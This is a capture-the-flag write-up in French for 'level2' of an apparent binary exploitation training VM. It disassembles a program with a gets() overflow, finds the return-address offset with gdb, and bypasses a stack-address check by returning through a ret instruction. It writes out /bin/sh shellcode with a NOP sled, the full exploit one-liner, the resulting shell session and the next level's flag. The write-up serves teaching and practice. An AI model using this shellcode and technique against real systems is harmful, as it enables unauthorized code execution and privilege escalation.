## Démarches

Même réflexes que pour les levels précédents :

- Le binaire ./level2 attend quelque chose sur l'entrée standard, qu'il réimprime par la suite avant de quitter.
- `objdump -d level2` :
  - le main appelle une fonction `p` :
    ```
    804853f:	55                   	push   %ebp
    8048540:	89 e5                	mov    %esp,%ebp
    8048542:	83 e4 f0             	and    $0xfffffff0,%esp
    8048545:	e8 8a ff ff ff       	call   80484d4 <p>
    804854a:	c9                   	leave
    804854b:	c3                   	ret
    ```
  - la fonction p comporte les fonctions `fflush`, `gets`, `printf`, `exit`, `puts` et `strdup` :
    ```
    80484d4:	55                   	push   %ebp
    80484d5:	89 e5                	mov    %esp,%ebp
    80484d7:	83 ec 68             	sub    $0x68,%esp
    80484da:	a1 60 98 04 08       	mov    0x8049860,%eax
    80484df:	89 04 24             	mov    %eax,(%esp)
    80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
    80484e7:	8d 45 b4             	lea    -0x4c(%ebp),%eax
    80484ea:	89 04 24             	mov    %eax,(%esp)
    80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
    80484f2:	8b 45 04             	mov    0x4(%ebp),%eax
    80484f5:	89 45 f4             	mov    %eax,-0xc(%ebp)
    80484f8:	8b 45 f4             	mov    -0xc(%ebp),%eax
    80484fb:	25 00 00 00 b0       	and    $0xb0000000,%eax
    8048500:	3d 00 00 00 b0       	cmp    $0xb0000000,%eax
    8048505:	75 20                	jne    8048527 <p+0x53>
    8048507:	b8 20 86 04 08       	mov    $0x8048620,%eax
    804850c:	8b 55 f4             	mov    -0xc(%ebp),%edx
    804850f:	89 54 24 04          	mov    %edx,0x4(%esp)
    8048513:	89 04 24             	mov    %eax,(%esp)
    8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
    804851b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
    8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
    8048527:	8d 45 b4             	lea    -0x4c(%ebp),%eax
    804852a:	89 04 24             	mov    %eax,(%esp)
    804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
    8048532:	8d 45 b4             	lea    -0x4c(%ebp),%eax
    8048535:	89 04 24             	mov    %eax,(%esp)
    8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
    804853d:	c9                   	leave
    804853e:	c3                   	ret
    ```
- Comme au level1, il est possible de faire segfault le programme avec un overflow de `gets` :
  - Avec gdb + peda, on créé un pattern de 100 caractères que l'on passe sur l'entrée standard au lancement du programme :
    `pattern create 100`
    > 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

    `r < <(python -c 'print("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")'`

  - On recherche le pattern :
    `pattern search`
    > EIP+0 found at offset: 80
    > 
    > EBP+0 found at offset: 76

  - On peut vérifier que le buffer ne peut accepter que 76 caractères : 
    `r < <(python -c 'print(76*"A"+"1234")')`
    > EBP: 0x34333231 ('1234')

-  On peut observer avant l'appel du printf une comparaison : le programme vérifie qu'il ne copie pas une adresse de la stack (commençant par *0xb*)
    >    0x08048500 <+44>:	cmp    eax,0xb0000000

- La vérification empêche de faire appel à une adresse située sur la stack, mais on peut sauvegarder un shellcode appelant */bin/sh* dans l'env :
  ```
  export SHELLCODE=`python -c 'print("\x90"*200+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\xe0\xf6\xff\xbf")'`
  ```
- Dans GDB :
  - Récupérer avec gdb l'adresse du retour de p 
    `disass p`

    > 0x0804853e <+106>:	ret

  - Récupérer l'adresse de la var SHELLCODE dans l'env
    `x/s *((char **)environ)`
      > 0xbffff869

- Dans la VM (hors gdb), on passe dans l'entrée standard du programme 80 caractères (76 + 4 pour overflow le buffer), suivi de l'adresse de ret puis l'adresse du shellcode stocké dans l'env.
`(python -c 'print("A"*80+"\x3e\x85\x04\x08"+"\x69\xf8\xff\xbf")'; cat ) | ./level2

```
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>i���`
  ls
  ls: cannot open directory .: Permission denied
  pwd
  /home/user/level2
  whoami
  level3
  ls -la /home/user/level3
  total 17
  dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
  dr-x--x--x  1 root   root    340 Sep 23  2015 ..
  -rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
  -rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
  -rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
  -rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
  -rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
  cat /home/user/level3/.pass
  492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
  ```




<br>





----
## Ressources
- https://dhavalkapil.com/blogs/Shellcode-Injection/
- https://gist.github.com/lzutao/ca76df0d98cd46e3f7a98f0ac3beed58#background-information
- https://beta.hackndo.com/buffer-overflow/#pratique
- https://payatu.com/understanding-stack-based-buffer-overflow